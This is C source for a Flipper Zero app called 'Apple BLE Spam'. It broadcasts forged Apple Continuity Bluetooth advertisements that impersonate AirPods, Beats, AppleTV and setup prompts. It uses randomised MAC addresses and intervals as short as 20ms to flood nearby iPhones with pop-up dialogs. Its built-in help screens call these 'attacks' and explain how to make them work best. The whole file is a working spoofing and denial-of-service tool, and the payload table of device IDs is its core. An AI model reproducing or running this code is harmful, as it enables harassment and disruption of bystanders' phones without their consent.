#include <gui/gui.h>
#include <gui/elements.h>
#include <furi_hal_bt.h>
#include <furi_hal_random.h>
#include <assets_icons.h>
#include "apple_ble_spam_icons.h"

#include "lib/continuity/continuity.h"

typedef struct {
    const char* title;
    const char* text;
    bool random;
    ContinuityMsg msg;
} Payload;

// Hacked together by @Willy-JL
// Custom adv logic by @Willy-JL and @xMasterX
// Extensive testing and research on behavior and parameters by @Willy-JL and @ECTO-1A
// Structures docs and Nearby Action IDs from https://github.com/furiousMAC/continuity/
// Proximity Pair IDs from https://github.com/ECTO-1A/AppleJuice/
// Airtag ID from https://techryptic.github.io/2023/09/01/Annoying-Apple-Fans/

static Payload payloads[] = {
#if false
            {.title = "AirDrop",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeAirDrop,
                     .data = {.airdrop = {}},
                 }},
            {.title = "Airplay Target",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeAirplayTarget,
                     .data = {.airplay_target = {}},
                 }},
            {.title = "Handoff",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeHandoff,
                     .data = {.handoff = {}},
                 }},
            {.title = "Tethering Source",
             .text = "",
             .random = false,
             .msg =
                 {
                     .type = ContinuityTypeTetheringSource,
                     .data = {.tethering_source = {}},
                 }},
    {.title = "Mobile Backup",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x04}},
         }},
    {.title = "Watch Setup",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x05}},
         }},
    {.title = "Internet Relay",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x07}},
         }},
    {.title = "WiFi Password",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x08}},
         }},
    {.title = "Repair",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0A}},
         }},
    {.title = "Apple Pay",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0C}},
         }},
    {.title = "Developer Tools Pairing Request",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0E}},
         }},
    {.title = "Answered Call",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0F}},
         }},
    {.title = "Ended Call",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x10}},
         }},
    {.title = "DD Ping",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x11}},
         }},
    {.title = "DD Pong",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x12}},
         }},
    {.title = "Companion Link Proximity",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x14}},
         }},
    {.title = "Remote Management",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x15}},
         }},
    {.title = "Remote Auto Fill Pong",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x16}},
         }},
    {.title = "Remote Display",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x17}},
         }},
#endif
    {.title = "Random Action",
     .text = "Spam shuffle Nearby Actions",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x00}},
         }},
    {.title = "Random Pair",
     .text = "Spam shuffle Proximity Pairs",
     .random = true,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x00, .model = 0x0000}},
         }},
    {.title = "AppleTV AutoFill",
     .text = "Banner, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x13}},
         }},
    {.title = "AppleTV Connecting...",
     .text = "Modal, unlocked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x27}},
         }},
    {.title = "Join This AppleTV?",
     .text = "Modal, unlocked, spammy",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xBF, .type = 0x20}},
         }},
    {.title = "AppleTV Audio Sync",
     .text = "Banner, locked, long range",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x19}},
         }},
    {.title = "AppleTV Color Balance",
     .text = "Banner, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x1E}},
         }},
    {.title = "Setup New iPhone",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x09}},
         }},
    {.title = "Setup New Random",
     .text = "Modal, locked, glitched",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0x40, .type = 0x09}},
         }},
    {.title = "Transfer Phone Number",
     .text = "Modal, locked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x02}},
         }},
    {.title = "HomePod Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0B}},
         }},
    {.title = "AirPods Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0E20}},
         }},
    {.title = "Beats Solo 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0620}},
         }},
    {.title = "AirPods Max",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0A20}},
         }},
    {.title = "Beats Flex",
     .text = "Modal, laggy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1020}},
         }},
    {.title = "Airtag",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0055}},
         }},
    {.title = "Hermes Airtag",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x05, .model = 0x0030}},
         }},
    {.title = "Setup New AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x01}},
         }},
    {.title = "Pair AppleTV",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x06}},
         }},
    {.title = "HomeKit AppleTV Setup",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x0D}},
         }},
    {.title = "AppleID for AppleTV?",
     .text = "Modal, unlocked",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeNearbyAction,
             .data = {.nearby_action = {.flags = 0xC0, .type = 0x2B}},
         }},
    {.title = "AirPods",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0220}},
         }},
    {.title = "AirPods 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0F20}},
         }},
    {.title = "AirPods 3rd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1320}},
         }},
    {.title = "AirPods Pro 2nd Gen",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1420}},
         }},
    {.title = "Powerbeats 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0320}},
         }},
    {.title = "Powerbeats Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0B20}},
         }},
    {.title = "Beats Solo Pro",
     .text = "",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0C20}},
         }},
    {.title = "Beats Studio Buds",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1120}},
         }},
    {.title = "Beats X",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0520}},
         }},
    {.title = "Beats Studio 3",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x0920}},
         }},
    {.title = "Beats Studio Pro",
     .text = "Modal, spammy (stays open)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1720}},
         }},
    {.title = "Beats Fit Pro",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1220}},
         }},
    {.title = "Beats Studio Buds+",
     .text = "Modal, spammy (auto close)",
     .random = false,
     .msg =
         {
             .type = ContinuityTypeProximityPair,
             .data = {.proximity_pair = {.prefix = 0x01, .model = 0x1620}},
         }},
};

#define PAYLOAD_COUNT ((signed)COUNT_OF(payloads))

struct {
    uint8_t count;
    ContinuityData** datas;
} randoms[ContinuityTypeCount] = {0};

uint16_t delays[] = {
    20,
    50,
    100,
    150,
    200,
    300,
    400,
    500,
    750,
    1000,
    1500,
    2000,
    2500,
    3000,
    4000,
    5000,
};

typedef struct {
    bool resume;
    bool advertising;
    uint8_t delay;
    uint8_t size;
    uint8_t* packet;
    Payload* payload;
    FuriThread* thread;
    uint8_t mac[GAP_MAC_ADDR_SIZE];
    int8_t index;
} State;

static int32_t adv_thread(void* ctx) {
    State* state = ctx;
    Payload* payload = state->payload;
    ContinuityMsg* msg = &payload->msg;
    ContinuityType type = msg->type;

    while(state->advertising) {
        if(payload->random) {
            uint8_t random_i = rand() % randoms[type].count;
            memcpy(&msg->data, randoms[type].datas[random_i], sizeof(msg->data));
        }
        continuity_generate_packet(msg, state->packet);
        furi_hal_bt_custom_adv_set(state->packet, state->size);
        furi_thread_flags_wait(true, FuriFlagWaitAny, delays[state->delay]);
    }

    return 0;
}

static void stop_adv(State* state) {
    state->advertising = false;
    furi_thread_flags_set(furi_thread_get_id(state->thread), true);
    furi_thread_join(state->thread);
    furi_hal_bt_custom_adv_stop();
}

static void start_adv(State* state) {
    state->advertising = true;
    furi_thread_start(state->thread);
    uint16_t delay = delays[state->delay];
    furi_hal_bt_custom_adv_start(delay, delay, 0x00, state->mac, 0x1F);
}

static void toggle_adv(State* state, Payload* payload) {
    if(state->advertising) {
        stop_adv(state);
        if(state->resume) furi_hal_bt_start_advertising();
        state->payload = NULL;
        free(state->packet);
        state->packet = NULL;
        state->size = 0;
    } else {
        state->size = continuity_get_packet_size(payload->msg.type);
        state->packet = malloc(state->size);
        state->payload = payload;
        furi_hal_random_fill_buf(state->mac, sizeof(state->mac));
        state->resume = furi_hal_bt_is_active();
        furi_hal_bt_stop_advertising();
        start_adv(state);
    }
}

#define PAGE_MIN (-5)
#define PAGE_MAX PAYLOAD_COUNT
enum {
    PageApps = PAGE_MIN,
    PageDelay,
    PageDistance,
    PageProximityPair,
    PageNearbyAction,
    PageStart = 0,
    PageEnd = PAYLOAD_COUNT - 1,
    PageAbout = PAGE_MAX,
};

static void draw_callback(Canvas* canvas, void* ctx) {
    State* state = ctx;
    const char* back = "Back";
    const char* next = "Next";
    switch(state->index) {
    case PageStart - 1:
        next = "Spam";
        break;
    case PageStart:
        back = "Help";
        break;
    case PageEnd:
        next = "About";
        break;
    case PageEnd + 1:
        back = "Spam";
        break;
    }

    canvas_set_font(canvas, FontSecondary);
    canvas_draw_icon(canvas, 3, 4, &I_apple_10px);
    canvas_draw_str(canvas, 14, 12, "Apple BLE Spam");

    switch(state->index) {
    case PageApps:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Some Apps\e# interfere\n"
            "with the attacks, stay on\n"
            "homescreen for best results",
            false);
        break;
    case PageDelay:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Delay\e# is time between\n"
            "attack attempts (top right),\n"
            "keep 20ms for best results",
            false);
        break;
    case PageDistance:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Distance\e# is limited, attacks\n"
            "work under 1 meter but a\n"
            "few are marked 'long range'",
            false);
        break;
    case PageProximityPair:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Proximity Pair\e# attacks\n"
            "keep spamming but work at\n"
            "very close range",
            false);
        break;
    case PageNearbyAction:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "Help");
        elements_text_box(
            canvas,
            4,
            16,
            120,
            48,
            AlignLeft,
            AlignTop,
            "\e#Nearby Actions\e# work one\n"
            "time then need to lock and\n"
            "unlock the phone",
            false);
        break;
    case PageAbout:
        canvas_set_font(canvas, FontBatteryPercent);
        canvas_draw_str_aligned(canvas, 124, 12, AlignRight, AlignBottom, "About");
        elements_text_box(
            canvas,
            4,
            16,
            122,
            48,
            AlignLeft,
            AlignTop,
            "App+spam by \e#WillyJL\e# XFW\n"
            "Pair codes by \e#ECTO-1A\e#\n"
            "BLE docs by \e#furiousMAC\e#\n"
            "                   Airtag \e#Techryptic\e#",
            false);
        break;
    default: {
        if(state->index < 0 || state->index > PAYLOAD_COUNT - 1) break;
        const Payload* payload = &payloads[state->index];
        char str[32];

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(str, sizeof(str), "%ims", delays[state->delay]);
        canvas_draw_str_aligned(canvas, 116, 12, AlignRight, AlignBottom, str);
        canvas_draw_icon(canvas, 119, 6, &I_SmallArrowUp_3x5);
        canvas_draw_icon(canvas, 119, 10, &I_SmallArrowDown_3x5);

        canvas_set_font(canvas, FontBatteryPercent);
        snprintf(
            str,
            sizeof(str),
            "%02i/%02i: %s",
            state->index + 1,
            PAYLOAD_COUNT,
            continuity_get_type_name(payload->msg.type));
        canvas_draw_str(canvas, 4 - (state->index < 19 ? 1 : 0), 21, str);

        canvas_set_font(canvas, FontPrimary);
        canvas_draw_str(canvas, 4, 32, payload->title);

        canvas_set_font(canvas, FontSecondary);
        canvas_draw_str(canvas, 4, 46, payload->text);

        elements_button_center(canvas, state->advertising ? "Stop" : "Start");
        break;
    }
    }

    if(state->index > PAGE_MIN) {
        elements_button_left(canvas, back);
    }
    if(state->index < PAGE_MAX) {
        elements_button_right(canvas, next);
    }
}

static void input_callback(InputEvent* input, void* ctx) {
    FuriMessageQueue* input_queue = ctx;
    if(input->type == InputTypeShort || input->type == InputTypeLong ||
       input->type == InputTypeRepeat) {
        furi_message_queue_put(input_queue, input, 0);
    }
}

int32_t apple_ble_spam(void* p) {
    UNUSED(p);
    for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
        if(payloads[payload_i].random) continue;
        randoms[payloads[payload_i].msg.type].count++;
    }
    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        if(!randoms[type].count) continue;
        randoms[type].datas = malloc(sizeof(ContinuityData*) * randoms[type].count);
        uint8_t random_i = 0;
        for(uint8_t payload_i = 0; payload_i < COUNT_OF(payloads); payload_i++) {
            if(payloads[payload_i].random) continue;
            if(payloads[payload_i].msg.type == type) {
                randoms[type].datas[random_i++] = &payloads[payload_i].msg.data;
            }
        }
    }

    State* state = malloc(sizeof(State));
    state->thread = furi_thread_alloc();
    furi_thread_set_callback(state->thread, adv_thread);
    furi_thread_set_context(state->thread, state);
    furi_thread_set_stack_size(state->thread, 2048);

    FuriMessageQueue* input_queue = furi_message_queue_alloc(8, sizeof(InputEvent));
    ViewPort* view_port = view_port_alloc();
    Gui* gui = furi_record_open(RECORD_GUI);
    view_port_input_callback_set(view_port, input_callback, input_queue);
    view_port_draw_callback_set(view_port, draw_callback, state);
    gui_add_view_port(gui, view_port, GuiLayerFullscreen);

    bool running = true;
    while(running) {
        InputEvent input;
        furi_check(furi_message_queue_get(input_queue, &input, FuriWaitForever) == FuriStatusOk);

        Payload* payload = (state->index >= 0 && state->index <= PAYLOAD_COUNT - 1) ?
                               &payloads[state->index] :
                               NULL;
        bool advertising = state->advertising;
        switch(input.key) {
        case InputKeyOk:
            if(payload) toggle_adv(state, payload);
            break;
        case InputKeyUp:
            if(payload && state->delay < COUNT_OF(delays) - 1) {
                if(advertising) stop_adv(state);
                state->delay++;
                if(advertising) start_adv(state);
            }
            break;
        case InputKeyDown:
            if(payload && state->delay > 0) {
                if(advertising) stop_adv(state);
                state->delay--;
                if(advertising) start_adv(state);
            }
            break;
        case InputKeyLeft:
            if(state->index > PAGE_MIN) {
                if(advertising) toggle_adv(state, payload);
                state->index--;
            }
            break;
        case InputKeyRight:
            if(state->index < PAGE_MAX) {
                if(advertising) toggle_adv(state, payload);
                state->index++;
            }
            break;
        case InputKeyBack:
            if(advertising) toggle_adv(state, payload);
            running = false;
            break;
        default:
            continue;
        }

        view_port_update(view_port);
    }

    gui_remove_view_port(gui, view_port);
    furi_record_close(RECORD_GUI);
    view_port_free(view_port);
    furi_message_queue_free(input_queue);

    furi_thread_free(state->thread);
    free(state);

    for(ContinuityType type = 0; type < ContinuityTypeCount; type++) {
        free(randoms[type].datas);
    }
    return 0;
}
